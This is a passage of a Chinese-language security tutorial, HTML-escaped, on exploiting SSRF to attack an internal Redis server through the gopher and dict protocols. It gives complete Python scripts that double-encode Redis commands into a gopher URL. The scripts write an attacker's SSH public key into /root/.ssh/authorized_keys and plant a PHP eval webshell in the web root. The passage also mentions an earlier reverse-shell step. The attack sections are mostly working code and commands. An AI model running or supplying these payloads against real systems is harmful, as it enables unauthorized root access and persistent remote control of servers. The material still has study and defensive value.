&lt;&#x2F;span&gt;&lt;span&gt;payload = url + urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(gopher,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) + encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 发起请求
&lt;&#x2F;span&gt;&lt;span&gt;request = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Request&lt;&#x2F;span&gt;&lt;span&gt;(payload)
&lt;&#x2F;span&gt;&lt;span&gt;response = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlopen&lt;&#x2F;span&gt;&lt;span&gt;(request).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;再次运行python脚本，便可成功反弹shell。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;0x03-xie-ssh-keygengong-yao-shi-yong-si-yao-deng-lu&quot;&gt;0x03 写ssh-keygen公钥，使用私钥登陆&lt;&#x2F;h3&gt;
&lt;p&gt;在上面的内容中描述了如何使用Redis的数据备份执行命令，接下来讲解通过写入ssh-keygen公钥，使用私钥登录。思路还是利用备份，将私钥字符串备份到目标服务器.ssh目录下。&lt;br &#x2F;&gt;要完成此操作，需要两个前提条件&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Redis服务使用ROOT账号启动(可以临时执行sudo -u root &#x2F;usr&#x2F;bin&#x2F;redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf 来以root权限运行)&lt;&#x2F;li&gt;
&lt;li&gt;服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;首先在本地生成一对密钥&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh-keygen -t&lt;&#x2F;span&gt;&lt;span&gt; rsa
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:.ssh&lt;&#x2F;span&gt;&lt;span&gt; margin$ ssh-keygen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -t&lt;&#x2F;span&gt;&lt;span&gt; rsa
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Generating&lt;&#x2F;span&gt;&lt;span&gt; public&#x2F;private rsa key pair.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; file in which to save the key (&#x2F;Users&#x2F;margin&#x2F;.ssh&#x2F;id_rsa)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;:  
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;&#x2F;Users&#x2F;margin&#x2F;.ssh&#x2F;id_rsa&lt;&#x2F;span&gt;&lt;span&gt; already exists.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Overwrite&lt;&#x2F;span&gt;&lt;span&gt; (y&#x2F;n)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt; y
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; passphrase (empty for no passphrase)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; same passphrase again: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Your&lt;&#x2F;span&gt;&lt;span&gt; identification has been saved in &#x2F;Users&#x2F;margin&#x2F;.ssh&#x2F;id_rsa.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Your&lt;&#x2F;span&gt;&lt;span&gt; public key has been saved in &#x2F;Users&#x2F;margin&#x2F;.ssh&#x2F;id_rsa.pub.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;The&lt;&#x2F;span&gt;&lt;span&gt; key fingerprint is:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SHA256:QKUmi&#x2F;y9Tu27soIg2+rRrvDO16sQBnrSCzkVx4RcTSw&lt;&#x2F;span&gt;&lt;span&gt; margin@margine.local
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;The&lt;&#x2F;span&gt;&lt;span&gt; key&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s randomart image is:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;+---[RSA 2048]----+
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;| ..=++o..        |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|  ooE.o.         |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|. . ..+          |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|.* . + .         |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|* B .   S        |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|o*.+ . .         |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|o=oo..o .        |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|oo=.o.oo         |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;|o==o.+=++o       |
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;+----[SHA256]-----+
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;查看密钥的字符串，一会使用Redis的备份功能，将密钥字符串传到目标服务器。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:.ssh&lt;&#x2F;span&gt;&lt;span&gt; margin$ cat id_rsa.pub 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh-rsa&lt;&#x2F;span&gt;&lt;span&gt; AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR&#x2F;wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c&#x2F;B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;构造payload，如下：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;config set dir &#x2F;root&#x2F;.ssh&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;config set dbfilename authorized_keys
&lt;&#x2F;span&gt;&lt;span&gt;set margin &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR&#x2F;wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c&#x2F;B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;save
&lt;&#x2F;span&gt;&lt;span&gt;quit
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;进一步得到python代码为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# -*- coding: UTF-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib2,urllib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;gopher = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gopher:&#x2F;&#x2F;192.168.0.67:6379&#x2F;_&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 攻击脚本
&lt;&#x2F;span&gt;&lt;span&gt;data = &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config set dir &#x2F;root&#x2F;.ssh&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config set dbfilename authorized_keys
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;set margin &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdIj0d7vofujQU9H2eYIboU16EKy61mAalJXYP66sPINFEToBb7YeaROlpg6&#x2F;B5u+lgcjOq2X+zxQwid4pSS2xj2kbornpeDXHh9boQqAzDdWgGBuRYi6scfiQ9hY0BN2rQ44gimQkKibM7MJR7XmqnUg&#x2F;pgIgbepDRlYghj0DUW2iHE9a&#x2F;z4aZXEZE1SN29OUyQmy&#x2F;4OOIsCsmmjZBYJ&#x2F;zmFaWG2aYbGRQDuc6iDITqN1T+CuNQ3PNZUb7GgZQ8FbJHgcFbOjNbfMBcP1SRoKKtA7YIx4eyFw0xUxKPwiAKDIWf3HqlfxTpGeoqMDyPumCioCNeDqeR5Wmy6q9OSn margin@margine.local&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;save
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;quit
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;data:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 先转为ASCII
&lt;&#x2F;span&gt;&lt;span&gt;        encoder += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(single_char)))
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = encoder.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%0d%0a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 二次编码
&lt;&#x2F;span&gt;&lt;span&gt;encoder = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(data))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;encoder
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 生存payload
&lt;&#x2F;span&gt;&lt;span&gt;payload = url + urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(gopher,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) + encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 发起请求
&lt;&#x2F;span&gt;&lt;span&gt;request = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Request&lt;&#x2F;span&gt;&lt;span&gt;(payload)
&lt;&#x2F;span&gt;&lt;span&gt;response = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlopen&lt;&#x2F;span&gt;&lt;span&gt;(request).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;response
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;0x04-xie-webshell&quot;&gt;0x04 写webshell&lt;&#x2F;h3&gt;
&lt;p&gt;经过上面文章的学习，对于写webshell来说便变得非常简单，要完成此操作，需要两个前提条件&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;当前运行redis的用户在web目录有写权限&lt;&#x2F;li&gt;
&lt;li&gt;知道web目录的绝对路径&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;步骤比较简单，原理还是利用Redis的备份功能，只不过这次是备份成webshell（redis所在的服务器需要phpstudy环境）&lt;br &#x2F;&gt;修改python中的payload，如下：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;quot;config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;config set dbfilename margin.php
&lt;&#x2F;span&gt;&lt;span&gt;set margin &amp;quot;\\n&amp;lt;?php eval($_POST[&amp;#39;margin&amp;#39;]);?&amp;gt;\\n&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;save
&lt;&#x2F;span&gt;&lt;span&gt;quit
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;python代码如下&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# -*- coding: UTF-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib2,urllib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;gopher = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gopher:&#x2F;&#x2F;192.168.0.67:6379&#x2F;_&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 攻击脚本
&lt;&#x2F;span&gt;&lt;span&gt;data = &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config set dbfilename margin.php
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;set margin &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n&amp;lt;?php eval($_POST[&amp;#39;margin&amp;#39;]);?&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;save
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;quit
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;data:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 先转为ASCII
&lt;&#x2F;span&gt;&lt;span&gt;        encoder += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(single_char)))
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = encoder.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%0d%0a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 二次编码
&lt;&#x2F;span&gt;&lt;span&gt;encoder = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(data))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;encoder
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 生存payload
&lt;&#x2F;span&gt;&lt;span&gt;payload = url + urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(gopher,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) + encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 发起请求
&lt;&#x2F;span&gt;&lt;span&gt;request = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Request&lt;&#x2F;span&gt;&lt;span&gt;(payload)
&lt;&#x2F;span&gt;&lt;span&gt;response = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlopen&lt;&#x2F;span&gt;&lt;span&gt;(request).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;response
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;执行后可以看到目标主机有了margin.php文件，使用菜刀连接即可。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ssrflou-dong-zhong-shi-yong-dao-de-qi-ta-xie-yi&quot;&gt;SSRF漏洞中使用到的其他协议&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;0x01-dictxie-yi&quot;&gt;0x01 dict协议&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;定义&lt;&#x2F;strong&gt;：词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。（摘自百度百科）&lt;br &#x2F;&gt;&lt;strong&gt;DICT协议在SSRF漏洞中使用&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;在SSRF利用中，gopher协议无疑是最好用的，但gopher协议的使用是有一定条件的，如下：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624868913528-040da6d1-7a06-4835-b300-6a197ba3824b.png#align=left&amp;amp;display=inline&amp;amp;height=173&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=173&amp;amp;originWidth=1440&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1314&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;当gopher协议无法使用时，怎么办？这时候可以使用dict协议，我们先看执行效果：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624868913549-a916b208-9986-4095-ac28-033a0fb8671f.png#align=left&amp;amp;display=inline&amp;amp;height=140&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;originHeight=140&amp;amp;originWidth=1330&amp;amp;size=0&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1330&quot; alt=&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt;由上图可以发现通过dict协议，可以看出目标端口的指纹信息，通过上图返回的指纹信息，可以明确，是6379的redis数据库。OK，现在我们知道，利用dict协议可以探测端口的开放情况和指纹信息，那么dict协议怎么进一步使用？有什么语法？以下为dict协议的使用：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;dict:&#x2F;&#x2F;serverip:port&#x2F;命令:参数&lt;&#x2F;li&gt;
&lt;li&gt;向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利&lt;&#x2F;li&gt;
&lt;li&gt;通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
